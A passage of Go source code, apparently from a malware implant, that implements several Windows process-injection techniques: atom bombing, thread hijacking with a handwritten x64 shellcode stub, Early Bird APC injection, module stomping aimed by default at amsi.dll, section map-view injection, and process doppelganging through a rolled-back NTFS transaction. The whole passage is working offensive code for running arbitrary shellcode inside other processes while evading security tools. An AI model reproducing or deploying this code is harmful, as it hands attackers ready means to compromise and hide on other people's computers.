		chunk := shellcode[i:end]

		// Create atom with shellcode chunk
		atom, _, err := procGlobalAddAtomA.Call(uintptr(unsafe.Pointer(&chunk[0])))
		if atom == 0 {
			// Clean up previously created atoms
			for _, a := range atoms {
				procGlobalDeleteAtom.Call(uintptr(a))
			}
			virtualFreeEx(hProcess, targetAddr, 0, MEM_RELEASE)
			return nil, fmt.Errorf("failed to create atom: %v", err)
		}

		atoms = append(atoms, uint16(atom))
	}

	// Step 3: Allocate memory for atom-reading shellcode
	// This shellcode will read atoms and write to targetAddr
	atomReaderSize := 1024
	atomReaderAddr, err := virtualAllocEx(hProcess, 0, atomReaderSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		// Clean up atoms
		for _, atom := range atoms {
			procGlobalDeleteAtom.Call(uintptr(atom))
		}
		virtualFreeEx(hProcess, targetAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to allocate atom reader memory: %v", err)
	}

	// Step 4: Generate atom reader shellcode
	// This shellcode calls GlobalGetAtomNameA for each atom and writes to targetAddr
	atomReaderShellcode := generateAtomReaderShellcode(atoms, targetAddr)
	err = writeProcessMemory(hProcess, atomReaderAddr, unsafe.Pointer(&atomReaderShellcode[0]), uintptr(len(atomReaderShellcode)))
	if err != nil {
		for _, atom := range atoms {
			procGlobalDeleteAtom.Call(uintptr(atom))
		}
		virtualFreeEx(hProcess, targetAddr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, atomReaderAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write atom reader: %v", err)
	}

	// Step 5: Get a thread to queue APC to
	threadIDs, err := enumProcessThreads(pid)
	if err != nil || len(threadIDs) == 0 {
		for _, atom := range atoms {
			procGlobalDeleteAtom.Call(uintptr(atom))
		}
		virtualFreeEx(hProcess, targetAddr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, atomReaderAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to enumerate threads: %v", err)
	}

	// Step 6: Queue APC to execute atom reader shellcode
	queuedCount := 0
	for _, tid := range threadIDs {
		hThread, _, _ := procOpenThread.Call(
			THREAD_SET_CONTEXT,
			0,
			uintptr(tid),
		)

		if hThread != 0 {
			ret, _, _ := procQueueUserAPC.Call(atomReaderAddr, hThread, 0)
			windows.CloseHandle(windows.Handle(hThread))
			if ret != 0 {
				queuedCount++
				break // Only need one successful queue
			}
		}
	}

	if queuedCount == 0 {
		for _, atom := range atoms {
			procGlobalDeleteAtom.Call(uintptr(atom))
		}
		virtualFreeEx(hProcess, targetAddr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, atomReaderAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to queue APC")
	}

	// Step 7: Wait a bit for atom reader to complete, then clean up atoms
	// In production, you might want to keep atoms longer
	// For now, we'll clean up immediately and hope the APC executes soon
	go func() {
		windows.SleepEx(5000, false) // Wait 5 seconds
		for _, atom := range atoms {
			procGlobalDeleteAtom.Call(uintptr(atom))
		}
	}()

	result := map[string]interface{}{
		"status":         "success",
		"method":         "atom_bombing",
		"pid":            pid,
		"atoms_created":  len(atoms),
		"target_address": fmt.Sprintf("0x%x", targetAddr),
		"reader_address": fmt.Sprintf("0x%x", atomReaderAddr),
		"shellcode_len":  len(shellcode),
		"note":           "Shellcode will execute when thread enters alertable state",
	}

	return json.Marshal(result)
}

// ThreadHijacking performs thread hijacking injection
func (i *Implant) ThreadHijacking(pid int, threadID uint32, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Allocate memory in target process
	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode to allocated memory
	err = writeProcessMemory(hProcess, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Open target thread with required permissions
	hThread, _, err := procOpenThread.Call(
		THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME,
		0,
		uintptr(threadID),
	)
	if hThread == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to open thread %d: %v", threadID, err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	// Suspend the target thread
	suspendCount, _, err := procSuspendThread.Call(hThread)
	if suspendCount == 0xFFFFFFFF {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("SuspendThread failed: %v", err)
	}

	// Get thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL
	err = getThreadContext(windows.Handle(hThread), &ctx)
	if err != nil {
		procResumeThread.Call(hThread)
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("GetThreadContext failed: %v", err)
	}

	// Save original RIP (instruction pointer)
	originalRIP := ctx.Rip

	// Generate stub shellcode that:
	// 1. Executes our payload
	// 2. Restores original RIP
	// 3. Jumps back to original execution
	hijackStub := generateThreadHijackStub(addr, originalRIP)

	// Allocate memory for hijack stub
	stubAddr, err := virtualAllocEx(hProcess, 0, len(hijackStub), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		procResumeThread.Call(hThread)
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to allocate stub memory: %v", err)
	}

	// Write hijack stub
	err = writeProcessMemory(hProcess, stubAddr, unsafe.Pointer(&hijackStub[0]), uintptr(len(hijackStub)))
	if err != nil {
		procResumeThread.Call(hThread)
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, stubAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write stub: %v", err)
	}

	// Modify RIP to point to our stub
	ctx.Rip = uint64(stubAddr)

	// Set modified context
	err = setThreadContext(windows.Handle(hThread), &ctx)
	if err != nil {
		procResumeThread.Call(hThread)
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, stubAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("SetThreadContext failed: %v", err)
	}

	// Resume the thread
	_, _, err = procResumeThread.Call(hThread)
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, stubAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("ResumeThread failed: %v", err)
	}

	result := map[string]interface{}{
		"status":         "success",
		"method":         "thread_hijacking",
		"pid":            pid,
		"thread_id":      threadID,
		"shellcode_addr": fmt.Sprintf("0x%x", addr),
		"stub_addr":      fmt.Sprintf("0x%x", stubAddr),
		"original_rip":   fmt.Sprintf("0x%x", originalRIP),
		"suspend_count":  suspendCount,
		"shellcode_len":  len(shellcode),
	}

	return json.Marshal(result)
}

// generateThreadHijackStub generates shellcode stub for thread hijacking
func generateThreadHijackStub(payloadAddr uintptr, returnAddr uint64) []byte {
	// x64 shellcode that:
	// 1. Saves all registers
	// 2. Calls payload
	// 3. Restores registers
	// 4. Jumps to original RIP
	shellcode := []byte{
		// Save all registers
		0x50,       // push rax
		0x51,       // push rcx
		0x52,       // push rdx
		0x53,       // push rbx
		0x55,       // push rbp
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x50, // push r8
		0x41, 0x51, // push r9
		0x41, 0x52, // push r10
		0x41, 0x53, // push r11
		0x41, 0x54, // push r12
		0x41, 0x55, // push r13
		0x41, 0x56, // push r14
		0x41, 0x57, // push r15
		0x9C, // pushfq

		// Align stack
		0x48, 0x83, 0xE4, 0xF0, // and rsp, 0xFFFFFFFFFFFFFFF0

		// Call payload
		0x48, 0xB8, // mov rax, payloadAddr
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xFF, 0xD0, // call rax

		// Restore registers
		0x9D,       // popfq
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5D, // pop rbp
		0x5B, // pop rbx
		0x5A, // pop rdx
		0x59, // pop rcx
		0x58, // pop rax

		// Jump to original RIP
		0x48, 0xB8, // mov rax, returnAddr
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xFF, 0xE0, // jmp rax
	}

	// Patch payload address at offset 26
	*(*uint64)(unsafe.Pointer(&shellcode[26])) = uint64(payloadAddr)

	// Patch return address at offset 67
	*(*uint64)(unsafe.Pointer(&shellcode[67])) = returnAddr

	return shellcode
}

// EarlyBirdInjection performs Early Bird APC injection on a newly created process
func (i *Implant) EarlyBirdInjection(processPath string, shellcode []byte) ([]byte, error) {
	if processPath == "" {
		processPath = "C:\\Windows\\System32\\notepad.exe"
	}

	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Create process in suspended state
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	processPathPtr, err := syscall.UTF16PtrFromString(processPath)
	if err != nil {
		return nil, err
	}

	err = windows.CreateProcess(
		nil,
		processPathPtr,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return nil, fmt.Errorf("failed to create process: %v", err)
	}

	defer func() {
		if err != nil {
			windows.TerminateProcess(pi.Process, 1)
		}
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
	}()

	// Allocate memory in target process
	addr, err := virtualAllocEx(pi.Process, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode
	err = writeProcessMemory(pi.Process, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		virtualFreeEx(pi.Process, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Queue APC to main thread (before it starts executing)
	ret, _, err := procQueueUserAPC.Call(
		addr,
		uintptr(pi.Thread),
		0,
	)

	if ret == 0 {
		virtualFreeEx(pi.Process, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("QueueUserAPC failed: %v", err)
	}

	// Resume the main thread - APC will execute immediately
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		virtualFreeEx(pi.Process, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("ResumeThread failed: %v", err)
	}

	result := map[string]interface{}{
		"status":        "success",
		"method":        "early_bird_apc",
		"process_path":  processPath,
		"pid":           pi.ProcessId,
		"tid":           pi.ThreadId,
		"address":       fmt.Sprintf("0x%x", addr),
		"shellcode_len": len(shellcode),
		"note":          "APC executed before process entry point",
	}

	return json.Marshal(result)
}

// ModuleStomping performs module stomping (overwrite legitimate DLL memory)
func (i *Implant) ModuleStomping(pid int, moduleName string, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	if moduleName == "" {
		moduleName = "amsi.dll" // Common target for stomping
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Get module base address
	moduleBase, moduleSize, err := getRemoteModuleInfo(hProcess, moduleName)
	if err != nil {
		return nil, fmt.Errorf("failed to get module info: %v", err)
	}

	if moduleSize < uint32(len(shellcode)) {
		return nil, fmt.Errorf("shellcode too large for target module (%d bytes needed, %d available)",
			len(shellcode), moduleSize)
	}

	// Change memory protection to RWX
	var oldProtect uint32
	ret, _, err := procVirtualProtectEx.Call(
		uintptr(hProcess),
		moduleBase,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("VirtualProtectEx failed: %v", err)
	}

	// Overwrite module memory with shellcode
	err = writeProcessMemory(hProcess, moduleBase, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		// Restore original protection
		procVirtualProtectEx.Call(
			uintptr(hProcess),
			moduleBase,
			uintptr(len(shellcode)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Create thread at stomped module base
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		moduleBase,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if hThread == 0 {
		return nil, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	result := map[string]interface{}{
		"status":         "success",
		"method":         "module_stomping",
		"pid":            pid,
		"module":         moduleName,
		"module_base":    fmt.Sprintf("0x%x", moduleBase),
		"module_size":    moduleSize,
		"shellcode_len":  len(shellcode),
		"thread_id":      threadID,
		"old_protection": fmt.Sprintf("0x%x", oldProtect),
	}

	return json.Marshal(result)
}

// getRemoteModuleInfo gets base address and size of a module in remote process
func getRemoteModuleInfo(hProcess windows.Handle, moduleName string) (uintptr, uint32, error) {
	// Get process ID from handle
	pid, err := windows.GetProcessId(hProcess)
	if err != nil || pid == 0 {
		return 0, 0, fmt.Errorf("failed to get process ID from handle: %v", err)
	}

	// Create snapshot of modules in target process
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE|windows.TH32CS_SNAPMODULE32, pid)
	if err != nil {
		return 0, 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))

	err = windows.Module32First(snapshot, &me)
	if err != nil {
		return 0, 0, fmt.Errorf("Module32First failed: %v", err)
	}

	// Iterate through modules
	for {
		currentModule := syscall.UTF16ToString(me.Module[:])

		// Case-insensitive comparison
		if len(currentModule) > 0 &&
			(syscall.UTF16ToString(me.Module[:]) == moduleName ||
				syscall.UTF16ToString(me.ExePath[:]) == moduleName) {
			return uintptr(unsafe.Pointer(me.ModBaseAddr)), me.ModBaseSize, nil
		}

		err = windows.Module32Next(snapshot, &me)
		if err != nil {
			break
		}
	}

	return 0, 0, fmt.Errorf("module %s not found in process %d", moduleName, pid)
}

// MapViewInjection performs section/map view injection
func (i *Implant) MapViewInjection(pid int, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Load ntdll functions
	ntCreateSection := ntdll.NewProc("NtCreateSection")
	ntMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Create a section object
	var hSection windows.Handle
	var maxSize int64 = int64(len(shellcode))

	ret, _, err := ntCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0x10000000, // SECTION_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		PAGE_EXECUTE_READWRITE,
		0x8000000, // SEC_COMMIT
		0,
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtCreateSection failed: 0x%x (%v)", ret, err)
	}
	defer windows.CloseHandle(hSection)

	// Map section into current process (for writing)
	var localAddr uintptr
	var viewSize uintptr = uintptr(len(shellcode))

	ret, _, err = ntMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localAddr)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2, // ViewUnmap
		0,
		PAGE_READWRITE,
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtMapViewOfSection (local) failed: 0x%x", ret)
	}

	// Write shellcode to local view
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(localAddr + uintptr(i))) = shellcode[i]
	}

	// Map section into target process (for execution)
	var remoteAddr uintptr
	viewSize = uintptr(len(shellcode))

	ret, _, err = ntMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&remoteAddr)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2, // ViewUnmap
		0,
		PAGE_EXECUTE_READ,
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtMapViewOfSection (remote) failed: 0x%x", ret)
	}

	// Create thread to execute shellcode
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		remoteAddr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if hThread == 0 {
		return nil, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	result := map[string]interface{}{
		"status":        "success",
		"method":        "map_view_injection",
		"pid":           pid,
		"local_addr":    fmt.Sprintf("0x%x", localAddr),
		"remote_addr":   fmt.Sprintf("0x%x", remoteAddr),
		"thread_id":     threadID,
		"shellcode_len": len(shellcode),
		"note":          "Shared memory section mapped between processes",
	}

	return json.Marshal(result)
}

// ProcessDoppelganging performs process doppelganging (transacted file injection)
func (i *Implant) ProcessDoppelganging(targetPath string, payloadBytes []byte) ([]byte, error) {
	if len(payloadBytes) < 1024 {
		return nil, fmt.Errorf("payload too small to be a valid PE file")
	}

	if targetPath == "" {
		targetPath = "C:\\Windows\\System32\\svchost.exe"
	}

	// Validate PE file
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payloadBytes[0]))
	if dosHeader.Magic != 0x5A4D {
		return nil, fmt.Errorf("invalid PE file: missing MZ signature")
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&payloadBytes[uint32(dosHeader.LfaNew)]))
	if ntHeaders.Signature != 0x4550 {
		return nil, fmt.Errorf("invalid PE file: missing PE signature")
	}

	// Load required DLLs and functions
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	procCreateTransaction := kernel32.NewProc("CreateTransaction")
	procRollbackTransaction := kernel32.NewProc("RollbackTransaction")
	procCreateFileTransacted := kernel32.NewProc("CreateFileTransactedW")
	procNtCreateSection := ntdll.NewProc("NtCreateSection")
	procNtCreateProcessEx := ntdll.NewProc("NtCreateProcessEx")
	procNtCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	procNtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	procNtReadVirtualMemory := ntdll.NewProc("NtReadVirtualMemory")
	procNtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	procNtResumeThread := ntdll.NewProc("NtResumeThread")

	// Step 1: Create NTFS transaction
	var hTransaction windows.Handle
	ret, _, err := procCreateTransaction.Call(
		0, // lpTransactionAttributes
		0, // UOW
		0, // CreateOptions
		0, // IsolationLevel
		0, // IsolationFlags
		0, // Timeout
		0, // Description
	)

	if ret == 0 || ret == 0xFFFFFFFFFFFFFFFF {
		return nil, fmt.Errorf("CreateTransaction failed: %v", err)
	}
	hTransaction = windows.Handle(ret)
	defer windows.CloseHandle(hTransaction)

	// Step 2: Create a temporary file name
	tempDir := os.TempDir()
	tempFileName := fmt.Sprintf("%s\\~df%x.tmp", tempDir, time.Now().UnixNano())
	tempFileNameW, err := syscall.UTF16PtrFromString(tempFileName)
	if err != nil {
		return nil, fmt.Errorf("failed to convert temp file name: %v", err)
	}

	// Step 3: Create transacted file
	var hFile windows.Handle
	ret, _, err = procCreateFileTransacted.Call(
		uintptr(unsafe.Pointer(tempFileNameW)),
		windows.GENERIC_WRITE|windows.GENERIC_READ,
		0, // No sharing
		0, // Security attributes
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0, // Template file
		uintptr(hTransaction),
		0, // MiniVersion
		0, // Reserved
	)

	if ret == 0 || ret == 0xFFFFFFFFFFFFFFFF {
		return nil, fmt.Errorf("CreateFileTransacted failed: %v", err)
	}
	hFile = windows.Handle(ret)

	// Step 4: Write payload to transacted file
	var bytesWritten uint32
	err = windows.WriteFile(hFile, payloadBytes, &bytesWritten, nil)
	if err != nil {
		windows.CloseHandle(hFile)
		procRollbackTransaction.Call(uintptr(hTransaction))
		return nil, fmt.Errorf("WriteFile failed: %v", err)
	}

	// Reset file pointer to beginning
	windows.SetFilePointer(hFile, 0, nil, windows.FILE_BEGIN)

	// Step 5: Create section from transacted file
	var hSection windows.Handle
	ret, _, err = procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0x10000000, // SECTION_ALL_ACCESS
		0,          // ObjectAttributes
		0,          // MaximumSize (use file size)
		PAGE_READONLY,
		0x1000000, // SEC_IMAGE
		uintptr(hFile),
	)

	windows.CloseHandle(hFile)

	if ret != 0 {
		procRollbackTransaction.Call(uintptr(hTransaction))
		return nil, fmt.Errorf("NtCreateSection failed: NTSTATUS 0x%x", ret)
	}
	defer windows.CloseHandle(hSection)

	// Step 6: Rollback transaction (file disappears from disk)
	ret, _, err = procRollbackTransaction.Call(uintptr(hTransaction))
	if ret == 0 {
		return nil, fmt.Errorf("RollbackTransaction failed: %v", err)
	}

	// Step 7: Create process from section
	var hProcess windows.Handle
	ret, _, err = procNtCreateProcessEx.Call(
		uintptr(unsafe.Pointer(&hProcess)),
		0x1FFFFF, // PROCESS_ALL_ACCESS
		0,        // ObjectAttributes
		uintptr(windows.CurrentProcess()),
		4, // PS_INHERIT_HANDLES
		uintptr(hSection),
		0, // DebugPort
		0, // ExceptionPort
		0, // InJob
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtCreateProcessEx failed: NTSTATUS 0x%x", ret)
	}
	defer windows.CloseHandle(hProcess)

	// Step 8: Query process information to get PEB address
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	ret, _, _ = procNtQueryInformationProcess.Call(
		uintptr(hProcess),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtQueryInformationProcess failed: NTSTATUS 0x%x", ret)
	}

	// Step 9: Read PEB to get image base address
	var imageBase uintptr
	ret, _, _ = procNtReadVirtualMemory.Call(
		uintptr(hProcess),
		pbi.PebBaseAddress+0x10, // PEB.ImageBaseAddress offset
		uintptr(unsafe.Pointer(&imageBase)),
		unsafe.Sizeof(imageBase),
		0,
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtReadVirtualMemory (PEB) failed: NTSTATUS 0x%x", ret)
	}

	// Step 10: Read image headers to get entry point
	headersBuf := make([]byte, 0x1000)
	ret, _, _ = procNtReadVirtualMemory.Call(
		uintptr(hProcess),
		imageBase,
		uintptr(unsafe.Pointer(&headersBuf[0])),
		uintptr(len(headersBuf)),
		0,
	)

	if ret != 0 {
		windows.TerminateProcess(hProcess, 1)
		return nil, fmt.Errorf("NtReadVirtualMemory (headers) failed: NTSTATUS 0x%x", ret)
	}

	remoteDosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&headersBuf[0]))
	remoteNtHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&headersBuf[remoteDosHeader.LfaNew]))
	entryPoint := imageBase + uintptr(remoteNtHeaders.OptionalHeader.AddressOfEntryPoint)

	// Step 11: Create full RTL_USER_PROCESS_PARAMETERS structure
	type UNICODE_STRING struct {
		Length        uint16
		MaximumLength uint16
		Buffer        uintptr
	}

	type RTL_USER_PROCESS_PARAMETERS struct {
		MaximumLength    uint32
		Length           uint32
		Flags            uint32
		DebugFlags       uint32
		ConsoleHandle    uintptr
		ConsoleFlags     uint32
		StdInputHandle   uintptr
		StdOutputHandle  uintptr
		StdErrorHandle   uintptr
		CurrentDirectory struct {
			DosPath UNICODE_STRING
			Handle  uintptr
		}
		DllPath               UNICODE_STRING
		ImagePathName         UNICODE_STRING
		CommandLine           UNICODE_STRING
		Environment           uintptr
		StartingPositionLeft  uint32
		StartingPositionTop   uint32
		Width                 uint32
		Height                uint32
		CharWidth             uint32
		CharHeight            uint32
		ConsoleTextAttributes uint32
		WindowFlags           uint32
		ShowWindowFlags       uint32
		WindowTitle           UNICODE_STRING
		DesktopName           UNICODE_STRING
		ShellInfo             UNICODE_STRING
		RuntimeData           UNICODE_STRING
		DLLPath               UNICODE_STRING
	}

	// Prepare command line string
	cmdLineStr, _ := syscall.UTF16FromString(targetPath)
	cmdLineBytes := make([]byte, len(cmdLineStr)*2)
	for i, c := range cmdLineStr {
		cmdLineBytes[i*2] = byte(c)
		cmdLineBytes[i*2+1] = byte(c >> 8)
	}

	// Prepare image path string
	imagePathStr, _ := syscall.UTF16FromString(targetPath)
	imagePathBytes := make([]byte, len(imagePathStr)*2)
	for i, c := range imagePathStr {
		imagePathBytes[i*2] = byte(c)
		imagePathBytes[i*2+1] = byte(c >> 8)
	}

	// Prepare current directory
	curDirStr, _ := syscall.UTF16FromString("C:\\Windows\\System32")
	curDirBytes := make([]byte, len(curDirStr)*2)
	for i, c := range curDirStr {
		curDirBytes[i*2] = byte(c)
		curDirBytes[i*2+1] = byte(c >> 8)
	}

	// Step 12: Allocate memory for strings in remote process
	cmdLineSize := len(cmdLineBytes)
	imagePathSize := len(imagePathBytes)
	curDirSize := len(curDirBytes)
	totalStringSize := cmdLineSize + imagePathSize + curDirSize + 0x1000 // Extra space

	// Allocate memory for process parameters in remote process
	paramsSize := uint32(unsafe.Sizeof(RTL_USER_PROCESS_PARAMETERS{})) + uint32(totalStringSize)
	remoteParams, err := virtualAllocEx(hProcess, 0, int(paramsSize), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		windows.TerminateProcess(hProcess, 1)
		return nil, fmt.Errorf("failed to allocate process parameters: %v", err)
	}

	// Calculate string buffer addresses in remote process
	stringBase := remoteParams + uintptr(unsafe.Sizeof(RTL_USER_PROCESS_PARAMETERS{}))
	remoteCmdLine := stringBase
	remoteImagePath := remoteCmdLine + uintptr(cmdLineSize)
	remoteCurDir := remoteImagePath + uintptr(imagePathSize)

	// Write strings to remote process
	ret, _, _ = procNtWriteVirtualMemory.Call(
		uintptr(hProcess),
		remoteCmdLine,
		uintptr(unsafe.Pointer(&cmdLineBytes[0])),
		uintptr(cmdLineSize),
		0,
	)

	ret, _, _ = procNtWriteVirtualMemory.Call(
		uintptr(hProcess),
		remoteImagePath,
		uintptr(unsafe.Pointer(&imagePathBytes[0])),
		uintptr(imagePathSize),
		0,
	)

	ret, _, _ = procNtWriteVirtualMemory.Call(
		uintptr(hProcess),
		remoteCurDir,
		uintptr(unsafe.Pointer(&curDirBytes[0])),
		uintptr(curDirSize),
		0,
	)

	// Build process parameters structure
	params := RTL_USER_PROCESS_PARAMETERS{
		MaximumLength: paramsSize,
		Length:        uint32(unsafe.Sizeof(RTL_USER_PROCESS_PARAMETERS{})),
		Flags:         0x00000001, // RTL_USER_PROC_PARAMS_NORMALIZED
		DebugFlags:    0,
		ConsoleHandle: 0,
		ConsoleFlags:  0,
	}

	// Set command line
	params.CommandLine.Length = uint16(len(cmdLineBytes) - 2) // Exclude null terminator
	params.CommandLine.MaximumLength = uint16(len(cmdLineBytes))
	params.CommandLine.Buffer = remoteCmdLine

	// Set image path
	params.ImagePathName.Length = uint16(len(imagePathBytes) - 2)
	params.ImagePathName.MaximumLength = uint16(len(imagePathBytes))
	params.ImagePathName.Buffer = remoteImagePath

	// Set current directory
	params.CurrentDirectory.DosPath.Length = uint16(len(curDirBytes) - 2)
	params.CurrentDirectory.DosPath.MaximumLength = uint16(len(curDirBytes))
	params.CurrentDirectory.DosPath.Buffer = remoteCurDir

	// Write process parameters to remote process
	paramsBytes := (*[1 << 20]byte)(unsafe.Pointer(&params))[:unsafe.Sizeof(params)]
	ret, _, _ = procNtWriteVirtualMemory.Call(
		uintptr(hProcess),
		remoteParams,
		uintptr(unsafe.Pointer(&paramsBytes[0])),
		uintptr(len(paramsBytes)),
		0,
	)

	// Write process parameters pointer to PEB
	ret, _, _ = procNtWriteVirtualMemory.Call(
		uintptr(hProcess),
		pbi.PebBaseAddress+0x20, // PEB.ProcessParameters offset
		uintptr(unsafe.Pointer(&remoteParams)),
		unsafe.Sizeof(remoteParams),
		0,
	)

	// Step 13: Create initial thread
	var hThread windows.Handle
	ret, _, err = procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes
		uintptr(hProcess),
		entryPoint,
		0, // Parameter
		4, // CREATE_SUSPENDED
		0, // ZeroBits
		0, // StackSize
		0, // MaximumStackSize
		0, // AttributeList
	)

	if ret != 0 {
		windows.TerminateProcess(hProcess, 1)
